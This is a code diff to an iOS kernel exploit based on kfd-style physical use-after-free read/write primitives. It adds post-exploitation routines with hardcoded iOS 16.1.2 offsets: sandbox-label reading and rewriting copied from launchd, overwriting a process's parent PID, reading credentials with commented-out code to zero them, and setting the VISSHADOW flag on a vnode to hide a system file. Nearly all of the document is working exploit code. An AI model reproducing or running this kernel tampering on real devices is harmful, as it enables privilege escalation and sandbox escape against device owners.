@@ -190,8 +190,9 @@ uint64_t kread64(u64 kfd, uint64_t where) {
 }
 
 void kwrite32(u64 kfd, uint64_t where, uint32_t what) {
-    u32 _buf[1] = {};
+    u32 _buf[2] = {};
     _buf[0] = what;
+    _buf[1] = kread32(kfd, where+4);
     kwrite((u64)(kfd), &_buf, where, sizeof(u64));
 }
 void kwrite64(u64 kfd, uint64_t where, uint64_t what) {
@@ -234,17 +235,164 @@ int getPidByName(u64 kfd, char* nm) {
     return kread32(kfd, getProcByName(kfd, nm) + 0x60);//PROC_P_PID_OFF);
 }
 
-//bool escapeSandboxForProcess(u64 kfd, uint64_t proc){
-//    uint64_t proc_ro = kread64(kfd, proc + 0x18);
-//    uint64_t ucreds = kread64(kfd, proc_ro + 0x20);
-//    uint64_t cr_label_pac = kread64(kfd, ucreds + 0x78);
-//    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
-//    printf("[i] cr_label: 0x%llx\n", cr_label);
-//    uint64_t sandbox_slot = kread64(kfd, cr_label + 0x10);
-//    printf("[i] sandbox_slot: 0x%llx\n", sandbox_slot);
-//    kwrite64(kfd, cr_label + 0x10/*SANDBOX_SLOT_OFF*/, 0);
-//    return false;
-//}
+bool escapeSandboxForProcess(u64 kfd, uint64_t proc){
+    uint64_t proc_ro = kread64(kfd, proc + 0x18);
+    uint64_t ucreds = kread64(kfd, proc_ro + 0x20);
+    uint64_t cr_label_pac = kread64(kfd, ucreds + 0x78);
+    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
+    printf("[i] cr_label: 0x%llx\n", cr_label);
+    uint64_t sandbox_slot = kread64(kfd, cr_label + 0x8);
+    printf("[i] sandbox_slot: 0x%llx\n", sandbox_slot);
+    sleep(3);
+    
+    uint64_t _pid = getPidByName(kfd, "launchd");
+    uint64_t _proc = getProc(kfd, _pid);
+    uint64_t _proc_ro = kread64(kfd, _proc + 0x18);
+    uint64_t _ucreds = kread64(kfd, _proc_ro + 0x20);
+    uint64_t _cr_label_pac = kread64(kfd, _ucreds + 0x78);
+    uint64_t _cr_label = _cr_label_pac | 0xffffff8000000000;
+    printf("[i] _cr_label: 0x%llx\n", _cr_label);
+    uint64_t _sandbox_slot = kread64(kfd, _cr_label + 0x8);
+    printf("[i] _sandbox_slot: 0x%llx\n", _sandbox_slot);
+    sleep(3);
+    
+//    sleep(3);
+//    kwrite((u64)(kfd), perfmon_device_uaddr + 20, perfmon_device_kaddr + 20, sizeof(u64));
+    
+//    uint64_t test = (uint64_t)malloc(8); // let's pretend this is a kernel address
+//    uint64_t value_to_copy = 0x4142434445464748; // Sample 64-bit value
+//        memcpy(test, &value_to_copy, sizeof(uint64_t));
+//    *test = (uint64_t)0x4142434445464748;
+//    void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
+//    kwrite_dup_kwrite_u64((u64)(kfd), 0x4142434445464748, test);
+//    kwrite64(kfd, test, 0x4142434445464748);
+//    printf("[i] Wrote: 0x%lx\n", 0x4142434445464748);
+//    printf("[i] Read back: 0x%llx\n", kread64(kfd, test));
+//    sleep(3);
+    
+    kwrite64(kfd, cr_label + 0x8/*SANDBOX_SLOT_OFF*/, sandbox_slot);
+    return false;
+}
+
+int funProc(u64 kfd, uint64_t proc) {
+    int p_ppid = kread32(kfd, proc + 0x20);
+    printf("[i] Patching proc->p_ppid to 1: %d\n", p_ppid);
+    kwrite32(kfd, proc + 0x20, 0x1);
+    
+    printf("getppid(): %u\n", getppid());
+    
+    int p_original_ppid = kread32(kfd, proc + 0x24);
+    printf("[i] self proc->p_original_ppid: %d\n", p_original_ppid);
+    
+    int p_pgrpid = kread32(kfd, proc + 0x28);
+    printf("[i] self proc->p_pgrpid: %d\n", p_pgrpid);
+    
+    int p_uid = kread32(kfd, proc + 0x2c);
+    printf("[i] self proc->p_uid: %d\n", p_uid);
+    
+    int p_gid = kread32(kfd, proc + 0x30);
+    printf("[i] self proc->p_gid: %d\n", p_gid);
+    
+    int p_ruid = kread32(kfd, proc + 0x34);
+    printf("[i] self proc->p_ruid: %d\n", p_ruid);
+    
+    int p_rgid = kread32(kfd, proc + 0x38);
+    printf("[i] self proc->p_rgid: %d\n", p_rgid);
+    
+    int p_svuid = kread32(kfd, proc + 0x3c);
+    printf("[i] self proc->p_svuid: %d\n", p_svuid);
+    
+    int p_svgid = kread32(kfd, proc + 0x40);
+    printf("[i] self proc->p_svgid: %d\n", p_svgid);
+    
+    return 0;
+}
+
+int funRoot(u64 kfd, uint64_t proc) {
+    uint64_t proc_ro = kread64(kfd, proc + 0x18);
+    uint64_t ucreds = kread64(kfd, proc_ro + 0x20);
+    uint64_t cr_posix_p = ucreds + 0x18;
+    
+    printf("[i] self ucred->posix_cred->cr_uid: %u\n", kread32(kfd, cr_posix_p + 0));
+    printf("[i] self ucred->posix_cred->cr_ruid: %u\n", kread32(kfd, cr_posix_p + 4));
+    printf("[i] self ucred->posix_cred->cr_svuid: %u\n", kread32(kfd, cr_posix_p + 8));
+    
+//    sleep(3);
+//    kwrite32(kfd, cr_posix_p+0, 501);
+//    printf("[i] self ucred->posix_cred->cr_uid: %u\n", kread32(kfd, cr_posix_p + 0));
+    
+//    kwrite64(kfd, cr_posix_p+0, 0);
+//    kwrite64(kfd, cr_posix_p+8, 0);
+//    kwrite64(kfd, cr_posix_p+16, 0);
+//    kwrite64(kfd, cr_posix_p+24, 0);
+//    kwrite64(kfd, cr_posix_p+32, 0);
+//    kwrite64(kfd, cr_posix_p+40, 0);
+//    kwrite64(kfd, cr_posix_p+48, 0);
+//    kwrite64(kfd, cr_posix_p+56, 0);
+//    kwrite64(kfd, cr_posix_p+64, 0);
+//    kwrite64(kfd, cr_posix_p+72, 0);
+//    kwrite64(kfd, cr_posix_p+80, 0);
+//    kwrite64(kfd, cr_posix_p+88, 0);
+    
+//    setgroups(0, 0);
+}
+
+uint64_t funVnode(u64 kfd, uint64_t proc, char* filename) {
+    //16.1.2 offsets
+    uint32_t off_p_pfd = 0xf8;
+    uint32_t off_fd_ofiles = 0;
+    uint32_t off_fp_fglob = 0x10;
+    uint32_t off_fg_data = 0x38;
+    uint32_t off_vnode_iocount = 0x64;
+    uint32_t off_vnode_usecount = 0x60;
+    uint32_t off_vnode_vflags = 0x54;
+    
+    int file_index = open(filename, O_RDONLY);
+    if (file_index == -1) return -1;
+    
+    //get vnode
+    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
+    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
+    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
+    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
+    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
+    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
+    uint64_t vnode = vnode_pac | 0xffffff8000000000;
+    printf("vnode: 0x%llx\n", vnode);
+    
+    //vnode_ref, vnode_get
+    uint32_t usecount = kread32(kfd, vnode + off_vnode_usecount);
+    uint32_t iocount = kread32(kfd, vnode + off_vnode_iocount);
+    printf("usecount: %d, iocount: %d\n", usecount, iocount);
+    kwrite32(kfd, vnode + off_vnode_usecount, usecount + 1);
+    kwrite32(kfd, vnode + off_vnode_iocount, iocount + 1);
+    
+#define VISSHADOW 0x008000
+    //hide file
+    uint32_t v_flags = kread32(kfd, vnode + off_vnode_vflags);
+    printf("v_flags: 0x%x\n", v_flags);
+    kwrite32(kfd, vnode + off_vnode_vflags, (v_flags | VISSHADOW));
+
+    //exist test (should not be exist
+    printf("[i] is File exist?: %d\n", access(filename, F_OK));
+    
+    //show file
+    v_flags = kread32(kfd, vnode + off_vnode_vflags);
+    kwrite32(kfd, vnode + off_vnode_vflags, (v_flags &= ~VISSHADOW));
+    
+    printf("[i] is File exist?: %d\n", access(filename, F_OK));
+
+    //restore vnode iocount, usecount
+    if(kread32(kfd, vnode + off_vnode_usecount) > 0)
+        kwrite32(kfd, vnode + off_vnode_usecount, usecount - 1);
+    if(kread32(kfd, vnode + off_vnode_iocount) > 0)
+        kwrite32(kfd, vnode + off_vnode_iocount, iocount - 1);
+    
+    close(file_index);
+
+    return 0;
+}
+
 
 u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
 {
@@ -275,9 +423,13 @@ u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
     uint64_t selfProc = getProc(kfd, myPid);
     printf("[i] self proc: 0x%llx\n", selfProc);
     
-    pid_t amfidPid = getPidByName(kfd, "amfid");
-    uint64_t amfidProc = getProc(kfd, amfidPid);
-    printf("[i] amfid proc: 0x%llx\n", amfidProc);
+    funRoot(kfd, selfProc);
+    funProc(kfd, selfProc);
+    funVnode(kfd, selfProc, "/System/Library/Audio/UISounds/photoShutter.caf");
+    
+//    printf("UID: %d\n", getuid());
+    
+//    escapeSandboxForProcess(kfd, selfProc);
     
     puaf_cleanup(kfd);
 
